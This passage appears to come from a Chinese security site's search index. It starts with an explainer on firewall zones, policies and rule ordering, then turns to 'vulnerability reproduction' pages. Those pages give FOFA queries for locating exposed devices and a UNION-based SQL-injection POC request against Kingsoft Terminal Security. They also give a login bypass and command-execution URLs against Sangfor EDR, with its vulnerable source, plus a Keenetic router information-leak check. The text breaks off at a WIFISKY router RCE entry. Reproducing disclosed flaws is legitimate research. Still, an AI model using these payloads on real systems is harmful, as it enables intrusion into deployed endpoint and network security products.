\u5b89\u5168\u533a\u57df\u53d1\u51fa\uff0c\u51e1\u662f\u63a5\u6536\u65b9\u662f\u9632\u706b\u5899\u7684\u62a5\u6587\uff08\u975e\u8f6c\u53d1\u62a5\u6587\uff09\u5747\u53ef\u8ba4\u4e3a\u662f\u7531 local \u5b89\u5168\u533a\u57df\u63a5\u6536\u3002</p> <p>\u53e6\u5916\u9664\u4e86\u7269\u7406\u63a5\u53e3\uff0c\u9632\u706b\u5899\u8fd8\u652f\u6301\u903b\u8f91\u63a5\u53e3\uff0c\u5982\u5b50\u63a5\u53e3\u3001VLANIF\u3001Tunnel \u63a5\u53e3\u7b49\uff0c\u8fd9\u4e9b\u903b\u8f91\u63a5\u53e3\u5728\u4f7f\u7528\u65f6\u4e5f\u9700\u8981\u52a0\u5165\u5b89\u5168\u533a\u57df\u3002</p>"},{"location":"Security_devices/Introduction/FW2/index.html#03","title":"03  \u5b89\u5168\u7b56\u7565","text":"<p>\u524d\u6587\u63d0\u5230\u9632\u706b\u5899\u901a\u8fc7\u89c4\u5219\u63a7\u5236\u6d41\u91cf\uff0c\u8fd9\u4e2a\u89c4\u5219\u5728\u9632\u706b\u5899\u4e0a\u88ab\u79f0\u4e3a\u201c\u5b89\u5168\u7b56\u7565\u201d\u3002</p> <p>\u5b89\u5168\u7b56\u7565\u662f\u9632\u706b\u5899\u4ea7\u54c1\u7684\u4e00\u4e2a\u57fa\u672c\u6982\u5ff5\u548c\u6838\u5fc3\u529f\u80fd\uff0c\u9632\u706b\u5899\u901a\u8fc7\u5b89\u5168\u7b56\u7565\u6765\u63d0\u4f9b\u5b89\u5168\u7ba1\u63a7\u80fd\u529b\u3002</p> <p>\u5982\u56fe 1-4 \u6240\u793a\uff0c\u5b89\u5168\u7b56\u7565\u7531\u5339\u914d\u6761\u4ef6\u3001\u52a8\u4f5c\u548c\u5185\u5bb9\u5b89\u5168\u914d\u7f6e\u6587\u4ef6\u7ec4\u6210\uff0c\u9488\u5bf9\u5141\u8bb8\u901a\u8fc7\u7684\u6d41\u91cf\u53ef\u4ee5\u8fdb\u4e00\u6b65\u505a\u53cd\u75c5\u6bd2\u3001\u5165\u4fb5\u9632\u5fa1\u7b49\u5185\u5bb9\u5b89\u5168\u68c0\u6d4b\u3002</p> <p>\u56fe 1-4 \u5b89\u5168\u7b56\u7565\u7684\u7ec4\u6210\u53ca Web \u754c\u9762\uff1a</p> <p></p> <p></p> <p>\u6240\u6709\u5339\u914d\u6761\u4ef6\u5728\u4e00\u6761\u5b89\u5168\u7b56\u7565\u4e2d\u90fd\u662f\u53ef\u9009\u914d\u7f6e\uff1b\u4f46\u662f\u4e00\u65e6\u914d\u7f6e\u4e86\uff0c\u5c31\u5fc5\u987b\u5168\u90e8\u7b26\u5408\u624d\u8ba4\u4e3a\u5339\u914d\uff0c\u5373\u8fd9\u4e9b\u5339\u914d\u6761\u4ef6\u4e4b\u95f4\u662f\u201c\u4e0e\u201d\u7684\u5173\u7cfb\u3002</p> <p>\u4e00\u4e2a\u5339\u914d\u6761\u4ef6\u4e2d\u5982\u679c\u914d\u7f6e\u4e86\u591a\u4e2a\u503c\uff0c\u591a\u4e2a\u503c\u4e4b\u95f4\u662f\u201c\u6216\u201d\u7684\u5173\u7cfb\uff0c\u53ea\u8981\u6d41\u91cf\u5339\u914d\u4e86\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u503c\uff0c\u5c31\u8ba4\u4e3a\u5339\u914d\u4e86\u8fd9\u4e2a\u6761\u4ef6\u3002</p> <p>\u4e00\u6761\u5b89\u5168\u7b56\u7565\u4e2d\u7684\u5339\u914d\u6761\u4ef6\u8d8a\u5177\u4f53\uff0c\u5176\u6240\u63cf\u8ff0\u7684\u6d41\u91cf\u8d8a\u7cbe\u786e\u3002</p> <p>\u4f60\u53ef\u4ee5\u53ea\u4f7f\u7528\u4e94\u5143\u7ec4\uff08\u6e90/\u76ee\u7684 IP \u5730\u5740\u3001\u7aef\u53e3\u3001\u534f\u8bae\uff09\u4f5c\u4e3a\u5339\u914d\u6761\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528\u9632\u706b\u5899\u7684\u5e94\u7528\u8bc6\u522b\u3001\u7528\u6237\u8bc6\u522b\u80fd\u529b\uff0c\u66f4\u7cbe\u786e\u3001\u66f4\u65b9\u4fbf\u5730\u914d\u7f6e\u5b89\u5168\u7b56\u7565\u3002</p>"},{"location":"Security_devices/Introduction/FW2/index.html#04","title":"04  \u7a7f\u5899\u5b89\u5168\u7b56\u7565\u4e0e\u672c\u5730\u5b89\u5168\u7b56\u7565","text":"<p>\u7a7f\u8fc7\u9632\u706b\u5899\u7684\u6d41\u91cf\u3001\u9632\u706b\u5899\u53d1\u51fa\u7684\u6d41\u91cf\u3001\u9632\u706b\u5899\u63a5\u6536\u7684\u6d41\u91cf\u5747\u53d7\u5b89\u5168\u7b56\u7565\u63a7\u5236\u3002</p> <p>\u5982\u56fe 1-5\u6240\u793a\uff0c\u5185\u7f51 PC \u65e2\u9700\u8981 Telnet \u767b\u5f55\u9632\u706b\u5899\u7ba1\u7406\u8bbe\u5907\uff0c\u53c8\u8981\u901a\u8fc7\u9632\u706b\u5899\u8bbf\u95ee Internet\u3002</p> <p>\u6b64\u65f6\u9700\u8981\u4e3a\u8fd9\u4e24\u79cd\u6d41\u91cf\u5206\u522b\u914d\u7f6e\u5b89\u5168\u7b56\u7565\u3002</p> <p>\u56fe 1-5 \u7a7f\u5899\u5b89\u5168\u7b56\u7565\u4e0e\u672c\u5730\u5b89\u5168\u7b56\u7565\uff1a</p> <p></p> <p></p> <p>\u5c24\u5176\u8bb2\u4e0b\u672c\u5730\u5b89\u5168\u7b56\u7565\uff0c\u4e5f\u5c31\u662f\u4e0e local \u57df\u76f8\u5173\u76f8\u5173\u7684\u5b89\u5168\u7b56\u7565\u3002</p> <p>\u4ee5\u4e0a\u4f8b\u5b50\u4e2d\uff0c\u4f4d\u4e8e trust\u57df\u7684 PC \u767b\u5f55\u9632\u706b\u5899\uff0c\u914d\u7f6e trust \u8bbf\u95ee local \u7684\u5b89\u5168\u7b56\u7565\uff1b</p> <p>\u53cd\u4e4b\u5982\u679c\u9632\u706b\u5899\u4e3b\u52a8\u8bbf\u95ee\u5176\u4ed6\u5b89\u5168\u533a\u57df\u7684\u5bf9\u8c61\uff0c\u4f8b\u5982\u9632\u706b\u5899\u5411\u65e5\u5fd7\u670d\u52a1\u5668\u4e0a\u62a5\u65e5\u5fd7\u3001\u9632\u706b\u5899\u8fde\u63a5\u5b89\u5168\u4e2d\u5fc3\u5347\u7ea7\u7279\u5f81\u5e93\u7b49\uff0c\u9700\u8981\u914d\u7f6e local \u5230\u5176\u4ed6\u5b89\u5168\u533a\u57df\u7684\u5b89\u5168\u7b56\u7565\u3002</p> <p>\u8bb0\u4f4f\u4e00\u70b9\uff0c\u9632\u706b\u5899\u672c\u8eab\u662f local \u5b89\u5168\u533a\u57df\uff0c\u63a5\u53e3\u52a0\u5165\u7684\u5b89\u5168\u533a\u57df\u4ee3\u8868\u63a5\u53e3\u8fde\u63a5\u7684\u7f51\u7edc\u5c5e\u4e8e\u6b64\u5b89\u5168\u533a\u57df\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5206\u6e05\u9632\u706b\u5899\u672c\u8eab\u548c\u5916\u754c\u7f51\u7edc\u7684\u57df\u95f4\u5173\u7cfb\u4e86\u3002</p>"},{"location":"Security_devices/Introduction/FW2/index.html#05","title":"05  \u7f3a\u7701\u5b89\u5168\u7b56\u7565\u4e0e\u5b89\u5168\u7b56\u7565","text":"<p>\u9632\u706b\u5899\u5b58\u5728\u4e00\u6761\u7f3a\u7701\u5b89\u5168\u7b56\u7565 default\uff0c\u9ed8\u8ba4\u7981\u6b62\u6240\u6709\u7684\u57df\u95f4\u6d41\u91cf\u3002</p> <p>\u7f3a\u7701\u7b56\u7565\u6c38\u8fdc\u4f4d\u4e8e\u7b56\u7565\u5217\u8868\u7684\u6700\u5e95\u7aef\uff0c\u4e14\u4e0d\u53ef\u5220\u9664\u3002</p> <p>\u7528\u6237\u521b\u5efa\u7684\u5b89\u5168\u7b56\u7565\uff0c\u6309\u7167\u521b\u5efa\u987a\u5e8f\u4ece\u4e0a\u5f80\u4e0b\u6392\u5217\uff0c\u65b0\u521b\u5efa\u7684\u5b89\u5168\u7b56\u7565\u9ed8\u8ba4\u4f4d\u4e8e\u7b56\u7565\u5217\u8868\u5e95\u90e8\uff0c\u7f3a\u7701\u7b56\u7565\u4e4b\u524d\u3002</p> <p>\u9632\u706b\u5899\u63a5\u6536\u5230\u6d41\u91cf\u4e4b\u540e\uff0c\u6309\u7167\u5b89\u5168\u7b56\u7565\u5217\u8868\u4ece\u4e0a\u5411\u4e0b\u4f9d\u6b21\u5339\u914d\u3002</p> <p>\u4e00\u65e6\u67d0\u4e00\u6761\u5b89\u5168\u7b56\u7565\u5339\u914d\u6210\u529f\uff0c\u5219\u505c\u6b62\u5339\u914d\uff0c\u5e76\u6309\u7167\u8be5\u5b89\u5168\u7b56\u7565\u6307\u5b9a\u7684\u52a8\u4f5c\u5904\u7406\u6d41\u91cf\u3002</p> <p>\u5982\u679c\u6240\u6709\u624b\u5de5\u521b\u5efa\u7684\u5b89\u5168\u7b56\u7565\u90fd\u672a\u5339\u914d\uff0c\u5219\u6309\u7167\u7f3a\u7701\u7b56\u7565\u5904\u7406\u3002</p> <p>\u7531\u6b64\u53ef\u89c1\uff0c\u5b89\u5168\u7b56\u7565\u5217\u8868\u7684\u987a\u5e8f\u662f\u5f71\u54cd\u7b56\u7565\u662f\u5426\u6309\u9884\u671f\u5339\u914d\u7684\u5173\u952e\uff0c\u65b0\u5efa\u5b89\u5168\u7b56\u7565\u540e\u5f80\u5f80\u9700\u8981\u624b\u52a8\u8c03\u6574\u987a\u5e8f\u3002</p> <p>\u4f01\u4e1a\u7684\u4e00\u53f0\u670d\u52a1\u5668\u5730\u5740\u4e3a 10.1.1.1\uff0c\u5141\u8bb8 IP \u7f51\u6bb5\u4e3a 10.2.1.0/24 \u7684\u529e\u516c\u533a\u8bbf\u95ee\u6b64\u670d\u52a1\u5668\uff0c\u914d\u7f6e\u4e86\u5b89\u5168\u7b56\u7565 policy1\u3002</p> <p>\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u540e\uff0c\u53c8\u8981\u6c42\u7981\u6b62\u4e24\u53f0\u4e34\u65f6\u529e\u516c PC\uff0810.2.1.1\u300110.2.1.2\uff09\u8bbf\u95ee\u670d\u52a1\u5668\u3002</p> <p>\u6b64\u65f6\u65b0\u914d\u7f6e\u7684\u5b89\u5168\u533a\u7b56\u7565 policy2 \u4f4d\u4e8e policy1 \u7684\u4e0b\u65b9\u3002</p> <p>\u56e0\u4e3a policy1 \u7684\u5730\u5740\u8303\u56f4\u8986\u76d6\u4e86policy2 \u7684\u5730\u5740\u8303\u56f4\uff0cpolicy2 \u6c38\u8fdc\u65e0\u6cd5\u88ab\u5339\u914d\u3002</p> <p></p> <p>\u9700\u8981\u624b\u52a8\u8c03\u6574 policy2 \u5230 policy1 \u7684\u4e0a\u65b9\uff0c\u8c03\u6574\u540e\u7684\u5b89\u5168\u7b56\u7565\u5982\u4e0b\uff1a</p> <p></p> <p>\u56e0\u6b64\uff0c\u914d\u7f6e\u5b89\u5168\u7b56\u7565\u65f6\uff0c\u6ce8\u610f\u5148\u7cbe\u786e\u540e\u5bbd\u6cdb\u3002\u5982\u679c\u65b0\u589e\u5b89\u5168\u7b56\u7565\uff0c\u6ce8\u610f\u548c\u5df2\u6709\u5b89\u5168\u7b56\u7565\u7684\u987a\u5e8f\uff0c\u5982\u679c\u4e0d\u7b26\u5408\u9884\u671f\u9700\u8981\u8c03\u6574\u3002</p>"},{"location":"Security_devices/Vulnerability_analysis/index.html","title":"\u5b89\u5168\u8bbe\u5907\u6f0f\u6d1e\u590d\u73b0","text":"<ul> <li>\u91d1\u5c71\u7ec8\u7aef\u5b89\u5168\u7cfb\u7edfV9.0 SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0</li> <li>\u6df1\u4fe1\u670dEDR\u4efb\u610f\u7528\u6237\u767b\u5f55\u4e0e\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790</li> <li>Keenetic\u8def\u7531\u5668\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e (CVE-2024-4021)</li> <li>WIFISKY-7\u5c42\u6d41\u63a7\u8def\u7531\u5668confirm.php\u63a5\u53e3\u5904\u5b58\u5728RCE\u6f0f\u6d1e</li> <li>\u5947\u5b89\u4fe1\u7f51\u795eSecGate3600\u9632\u706b\u5899obj_area_import_save\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e</li> </ul>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability1/index.html","title":"\u91d1\u5c71\u7ec8\u7aef\u5b89\u5168\u7cfb\u7edfV9.0 SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"Security_devices/Vulnerability_analysis/Vulnerability1/index.html#1","title":"1.\u91d1\u5c71\u7ec8\u7aef\u5b89\u5168\u7cfb\u7edf\u4ecb\u7ecd","text":"<p>EDR\uff08\u7ec8\u7aef\u68c0\u6d4b\u4e0e\u54cd\u5e94\uff09\u5b89\u5168\u8bbe\u5907\u662f\u4e00\u79cd\u7528\u4e8e\u4fdd\u62a4\u8ba1\u7b97\u673a\u7ec8\u7aef\u7684\u5b89\u5168\u89e3\u51b3\u65b9\u6848\u3002\u5b83\u7684\u4f5c\u7528\u4e3b\u8981\u5305\u62ec\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a</p> <ol> <li>\u68c0\u6d4b\u5a01\u80c1: EDR \u80fd\u591f\u76d1\u63a7\u7ec8\u7aef\u8bbe\u5907\u4e0a\u7684\u5404\u79cd\u6d3b\u52a8\uff0c\u5305\u62ec\u6587\u4ef6\u7cfb\u7edf\u3001\u8fdb\u7a0b\u3001\u7f51\u7edc\u8fde\u63a5\u7b49\uff0c\u4ee5\u8bc6\u522b\u6f5c\u5728\u7684\u5a01\u80c1\u884c\u4e3a\u3002\u5b83\u53ef\u4ee5\u68c0\u6d4b\u5230\u5404\u79cd\u7c7b\u578b\u7684\u6076\u610f\u8f6f\u4ef6\uff0c\u5982\u75c5\u6bd2\u3001\u6728\u9a6c\u3001\u52d2\u7d22\u8f6f\u4ef6\u7b49\uff0c\u4ee5\u53ca\u9ad8\u7ea7\u6301\u7eed\u6027\u5a01\u80c1\uff08APT\uff09\u7b49\u590d\u6742\u7684\u653b\u51fb\u3002</li> <li>\u54cd\u5e94\u5b89\u5168\u4e8b\u4ef6: EDR \u4e0d\u4ec5\u53ef\u4ee5\u68c0\u6d4b\u5a01\u80c1\uff0c\u8fd8\u53ef\u4ee5\u7acb\u5373\u91c7\u53d6\u63aa\u65bd\u54cd\u5e94\u5b89\u5168\u4e8b\u4ef6\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u963b\u6b62\u6076\u610f\u8fdb\u7a0b\u3001\u9694\u79bb\u53d7\u611f\u67d3\u7684\u7ec8\u7aef\u3001\u6e05\u9664\u6076\u610f\u6587\u4ef6\u7b49\u64cd\u4f5c\uff0c\u4ee5\u5c3d\u5feb\u904f\u5236\u5a01\u80c1\u7684\u6269\u6563\uff0c\u51cf\u5c11\u635f\u5931\u3002</li> <li>\u8c03\u67e5\u548c\u5206\u6790: EDR \u63d0\u4f9b\u4e86\u4e30\u5bcc\u7684\u4e8b\u4ef6\u8bb0\u5f55\u548c\u6570\u636e\u5206\u6790\u529f\u80fd\uff0c\u53ef\u4ee5\u5e2e\u52a9\u5b89\u5168\u56e2\u961f\u8fdb\u884c\u8c03\u67e5\u548c\u5206\u6790\u5b89\u5168\u4e8b\u4ef6\u3002\u8fd9\u5305\u62ec\u5206\u6790\u653b\u51fb\u8def\u5f84\u3001\u786e\u5b9a\u53d7\u5f71\u54cd\u7684\u7cfb\u7edf\u3001\u627e\u51fa\u653b\u51fb\u8005\u7684\u884c\u4e3a\u6a21\u5f0f\u7b49\uff0c\u6709\u52a9\u4e8e\u66f4\u597d\u5730\u7406\u89e3\u5a01\u80c1\u5e76\u63d0\u51fa\u6709\u6548\u7684\u5e94\u5bf9\u65b9\u6848\u3002</li> <li>\u5b89\u5168\u53ef\u89c1\u6027: EDR \u63d0\u4f9b\u4e86\u5bf9\u7ec8\u7aef\u8bbe\u5907\u7684\u5168\u9762\u53ef\u89c1\u6027\uff0c\u53ef\u4ee5\u5b9e\u65f6\u76d1\u63a7\u8bbe\u5907\u7684\u72b6\u6001\u548c\u884c\u4e3a\uff0c\u5e2e\u52a9\u7ba1\u7406\u5458\u53d1\u73b0\u5e76\u89e3\u51b3\u5b89\u5168\u95ee\u9898\u3002</li> </ol>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability1/index.html#2","title":"2.\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u91d1\u5c71\u7ec8\u7aef\u5b89\u5168\u7cfb\u7edfV9.0 <code>/inter/update_software_info_v2.php</code>\u9875\u9762\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8e\u91d1\u5c71\u7ec8\u7aef\u5b89\u5168\u7cfb\u7edf\u672a\u5bf9\u7528\u6237\u7684\u8f93\u5165\u8fdb\u884c\u6709\u6548\u7684\u8fc7\u6ee4\uff0c\u76f4\u63a5\u5c06\u5176\u62fc\u63a5\u8fdb\u4e86SQL\u67e5\u8be2\u8bed\u53e5\u4e2d\uff0c\u5bfc\u81f4\u7cfb\u7edf\u51fa\u73b0SQL\u6ce8\u5165\u6f0f\u6d1e\u3002</p>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability1/index.html#3","title":"3.\u6f0f\u6d1e\u590d\u73b0","text":"<p>FOFA\uff1atitle==\"\u7528\u6237\u767b\u5f55-\u91d1\u5c71\u7ec8\u7aef\u5b89\u5168\u7cfb\u7edfV9.0Web\u63a7\u5236\u53f0\"</p> <p></p> <p>poc\uff1a</p> <pre><code>POST /inter/update_software_info_v2.php HTTP/1.1\nHost: your-ip\nContent-Type: application/x-www-form-urlencoded\n\ntype=-1+UNION+SELECT+1,user(),3,4,5,6,7,8--&amp;key=&amp;pageCount=0&amp;curPage=\n</code></pre> <p></p> <p></p>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability2/index.html","title":"\u6df1\u4fe1\u670dEDR\u4efb\u610f\u7528\u6237\u767b\u5f55\u4e0e\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790","text":""},{"location":"Security_devices/Vulnerability_analysis/Vulnerability2/index.html#1edr","title":"1.\u6df1\u4fe1\u670dEDR\u7b80\u4ecb","text":"<p>\u7ec8\u7aef\u68c0\u6d4b\u54cd\u5e94\u5e73\u53f0\uff08EDR\uff09\u662f\u6df1\u4fe1\u670d\u516c\u53f8\u63d0\u4f9b\u7684\u4e00\u5957\u7ec8\u7aef\u5b89\u5168\u89e3\u51b3\u65b9\u6848\uff0cEDR \u7684\u7ba1\u7406\u5e73\u53f0\u652f\u6301\u7edf\u4e00\u7684\u7ec8\u7aef\u8d44\u4ea7\u7ba1\u7406\u3001\u7ec8\u7aef\u5b89\u5168\u4f53\u68c0\u3001\u7ec8\u7aef\u5408\u89c4\u68c0\u67e5\uff0c\u652f\u6301\u5fae\u9694\u79bb\u7684\u8bbf\u95ee\u63a7\u5236\u7b56\u7565\u7edf\u4e00\u7ba1\u7406\uff0c \u652f\u6301\u5bf9\u5b89\u5168\u4e8b\u4ef6\u7684\u4e00\u952e\u9694\u79bb\u5904\u7f6e\uff0c\u4ee5\u53ca\u70ed\u70b9\u4e8b\u4ef6 IOC \u7684\u5168\u7f51\u5a01\u80c1\u5b9a\u4f4d\uff0c\u5386\u53f2\u884c\u4e3a\u6570\u636e\u7684\u6eaf\u6e90\u5206\u6790\uff0c\u8fdc\u7a0b\u534f\u52a9\u53d6\u8bc1\u8c03\u67e5\u5206\u6790\u3002</p>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability2/index.html#2edr","title":"2.\u6df1\u4fe1\u670dEDR\u6f0f\u6d1e","text":""},{"location":"Security_devices/Vulnerability_analysis/Vulnerability2/index.html#21","title":"2.1.\u540e\u53f0\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e","text":"<pre><code>payload\uff1ahttps://IP\u5730\u5740/ui/login.php?user=admin\n</code></pre> <p>\u6ce8\u610f\u540e\u9762\u7684admin\u662f\u5fc5\u987b\u5b58\u5728\u7684\u7528\u6237\uff0c\u4e5f\u5c31\u662f\u8bf4EDR\u8bbe\u5907\u4e0a\u5fc5\u987b\u5b58\u5728admin\u7684\u7528\u6237\uff0c\u8fd9\u6837\u624d\u80fd\u76f4\u63a5\u767b\u5f55admin\uff0c\u82e5\u8bbf\u95ee\u7684\u662f\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u7528\u6237\uff0c\u90a3\u4e48\u5fc5\u7136\u65e0\u6cd5\u767b\u5f55\u3002</p> <p></p> <p>2.2.\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e</p> <pre><code>https://xxx.xxx.xx.xx/tool/log/c.php?strip_slashes=system&amp;host=id\nhttps://xxx.xxx.xx.xx/tool/log/c.php?strip_slashes=system&amp;path=id\nhttps://xxx.xxx.xx.xx/tool/log/c.php?strip_slashes=system&amp;row=id\nhttps://xxx.xxx.xx.xx/tool/log/c.php?strip_slashes=system&amp;limit=id\n</code></pre> <p>\u539f\u7406\u5c31\u662f\u5178\u578b\u7684\u53d8\u91cf\u8986\u76d6\u6f0f\u6d1e\u3002</p> <p></p> <p>tool/log/c.php \u90e8\u5206\u6e90\u7801\uff1a</p> <pre><code>&lt;?php  \ncall_user_func(function() {\n    ....\n\n    /**\n     * \u663e\u793a\u8868\u5355\n     * @param array $params \u8bf7\u6c42\u53c2\u6570\n     * @return\n     */\n    $show_form = function($params) use(&amp;$strip_slashes, &amp;$show_input) {\n        extract($params);\n        $host  = isset($host)  ? $strip_slashes($host)  : \"127.0.0.1\";\n        $path  = isset($path)  ? $strip_slashes($path)  : \"\";\n        $row   = isset($row)   ? $strip_slashes($row)   : \"\";\n        $limit = isset($limit) ? $strip_slashes($limit) : 1000;\n\n        // \u7ed8\u5236\u8868\u5355\n        echo \"&lt;pre&gt;\";\n        echo '&lt;form id=\"studio\" name=\"studio\" method=\"post\" action=\"\"&gt;';\n        $show_input(array(\"title\" =&gt; \"Host \",  \"name\" =&gt; \"host\",  \"value\" =&gt; $host,  \"note\" =&gt; \" - host, e.g. 127.0.0.1\"));\n        $show_input(array(\"title\" =&gt; \"Path \",  \"name\" =&gt; \"path\",  \"value\" =&gt; $path,  \"note\" =&gt; \" - path regex, e.g. mapreduce\"));\n        $show_input(array(\"title\" =&gt; \"Row  \",  \"name\" =&gt; \"row\",   \"value\" =&gt; $row,   \"note\" =&gt; \" - row regex, e.g. \\s[w|e]\\s\"));\n        $show_input(array(\"title\" =&gt; \"Limit\",  \"name\" =&gt; \"limit\", \"value\" =&gt; $limit, \"note\" =&gt; \" - top n, e.g. 100\"));\n        echo '&lt;input type=\"submit\" id=\"button\"&gt;';\n        echo '&lt;/form&gt;';\n        echo \"&lt;/pre&gt;\";\n    };\n\n    /**\n     * \u5165\u53e3\u51fd\u6570\n     * @param array $argv \u914d\u7f6e\u53c2\u6570\n     * @return\n     */\n    $main = function($argv)\n        use(&amp;$collect) {\n        extract($argv);\n        if (!isset($limit)) {\n            return;\n        }\n        $result = $collect($path, $row, $limit, $host);\n        if (!is_array($result)) {\n            echo $result, \"\\n\";\n            return;\n        }\n        if (!isset($result[\"success\"]) || $result[\"success\"] !== true) {\n            echo $result, \"\\n\";\n            return;\n        }\n        foreach ($result[\"data\"] as $host =&gt; $items) {\n            $last = \"\";\n            foreach ($items as $item) {\n                if ($item[\"name\"] != $last) {\n                    $last = $item[\"name\"];\n                    echo \"\\n[$host] -&gt; $last\\n\\n\";\n                }\n                echo $item[\"item\"], \"\\n\";\n            }\n        }\n    };\n\n    set_time_limit(0);\n    echo '&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" Content=\"text/html; Charset=utf-8\"&gt;&lt;/head&gt;';\n    echo '&lt;body bgcolor=\"#e8ddcb\"&gt;';\n    echo \"&lt;p&gt;&lt;b&gt;Log Helper&lt;/b&gt;&lt;/p&gt;\";\n    $show_form($_REQUEST);\n    echo \"&lt;pre&gt;\";\n    $main($_REQUEST);\n    echo \"&lt;/pre&gt;\"; \n});\n?&gt;\n</code></pre>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability3/index.html","title":"Keenetic\u8def\u7531\u5668\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e (CVE-2024-4021)","text":""},{"location":"Security_devices/Vulnerability_analysis/Vulnerability3/index.html#1","title":"1.\u6f0f\u6d1e\u8be6\u60c5","text":"<p>\u5728Keenetic KN-1010\u3001KN-1410\u3001KN-1711\u3001KN-1810\u548cKN-1910\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u8bbf\u95ee\u56fa\u5b9a\u5730\u5740\u53ef\u4ee5\u5bfc\u81f4\u4fe1\u606f\u62ab\u9732\u3002\u53ef\u4ee5\u8fdc\u7a0b\u53d1\u8d77\u653b\u51fb,\u5e76\u53ef\u80fd\u88ab\u5229\u7528\u3002</p>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability3/index.html#2","title":"2.\u6f0f\u6d1e\u4ee3\u7801\u5b58\u5728\u4f4d\u7f6e","text":"<pre><code>/ndmComponents.js\n/version.js\n</code></pre>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability3/index.html#3","title":"3.\u6f0f\u6d1e\u590d\u73b0","text":"<p>fofa\uff1a</p> <pre><code>\"ndmComponents.js\"\n</code></pre> <p></p>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability3/index.html#1ndmcomponentsjs","title":"1.ndmComponents.js","text":"<p>JavaScript\u6587\u4ef6\u4e2dndmComponents.js\u516c\u5f00\u4e86\u8be6\u7ec6\u7684\u914d\u7f6e\u8bbe\u5b9a\uff0c\u5176\u4e2d\u5305\u62ecopenvpn\uff08\u5f00\u653e\u865a\u62df\u79c1\u6709\u7f51\u7edc\uff09\u3001wireguard\uff08\u4e00\u79cd\u65b0\u578b\u7684\u865a\u62df\u4e13\u7528\u7f51\u7edc\u534f\u8bae\uff09\u4ee5\u53cawpa3\uff08\u7b2c\u4e09\u4ee3\u65e0\u7ebf\u7f51\u7edc\u5b89\u5168\u534f\u8bae\uff09\u7b49\u4fe1\u606f\uff0c\u8fd9\u4e9b\u900f\u9732\u4e86\u5f53\u524d\u7cfb\u7edf\u91c7\u7528\u7684\u901a\u4fe1\u534f\u8bae\u4e0e\u5b89\u5168\u9632\u62a4\u63aa\u65bd\u3002\u8fd9\u610f\u5473\u7740\uff0c\u653b\u51fb\u8005\u53ef\u501f\u6b64\u6d1e\u5bdf\u5230\u7f51\u7edc\u6240\u91c7\u7528\u7684\u52a0\u5bc6\u6280\u672f\u3001\u96a7\u9053\u534f\u8bae\u7b49\u6838\u5fc3\u5b89\u5168\u914d\u7f6e\uff0c\u4fbf\u4e8e\u4ed6\u4eec\u9488\u5bf9\u6027\u5730\u63a2\u7d22\u8fd9\u4e9b\u6280\u672f\u4e2d\u5b58\u5728\u7684\u5df2\u77e5\u6f0f\u6d1e\u6216\u914d\u7f6e\u758f\u6f0f\uff0c\u589e\u52a0\u4e86\u672a\u6388\u6743\u8bbf\u95ee\u548c\u64cd\u63a7\u7f51\u7edc\u7684\u98ce\u9669\u3002</p> <pre><code>/ndmComponents.js\n</code></pre> <p></p>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability3/index.html#2versionjs","title":"2.version.js","text":"<p>JavaScript\u6587\u4ef6\u4e2dversion.js\u660e\u786e\u63ed\u9732\u4e86\u56fa\u4ef6\u7248\u672c\u3001\u786c\u4ef6ID\u53ca\u5176\u4ed6\u7cfb\u7edf\u8bbe\u7f6e\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u5bf9\u4e8e\u8bc6\u522b\u8bbe\u5907\u578b\u53f7\u548c\u8fd0\u884c\u53c2\u6570\u81f3\u5173\u91cd\u8981\u3002</p> <p></p>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability4/index.html","title":"WIFISKY-7\u5c42\u6d41\u63a7\u8def\u7531\u5668confirm.php\u63a5\u53e3\u5904\u5b58\u5728RCE\u6f0f\u6d1e","text":""},{"location":"Security_devices/Vulnerability_analysis/Vulnerability4/index.html#1","title":"1.\u4ea7\u54c1\u4ecb\u7ecd","text":"<p>WIFISKY7\u662f\u4e00\u6b3e\u652f\u63017\u5c42\u6d41\u63a7\u7684\u667a\u80fd\u8def\u7531\u5668\uff0c\u901a\u8fc7\u6df1\u5ea6\u5305\u68c0\u6d4b\u6280\u672f\uff0c\u5728\u7f51\u7edc\u5c42\u9762\u5b9e\u73b0\u7cbe\u51c6\u7684\u6d41\u91cf\u63a7\u5236\u3002\u5176\u7279\u70b9\u5305\u62ec\u9ad8\u5ea6\u53ef\u5b9a\u5236\u7684\u5e94\u7528\u8bc6\u522b\u3001\u667a\u80fdQoS\u7ba1\u7406\u548c\u5f3a\u5927\u7684\u5b89\u5168\u9632\u62a4\u529f\u80fd\u3002\u7528\u6237\u53ef\u4ee5\u6839\u636e\u9700\u6c42\uff0c\u7075\u6d3b\u8bbe\u7f6e\u4e0d\u540c\u5e94\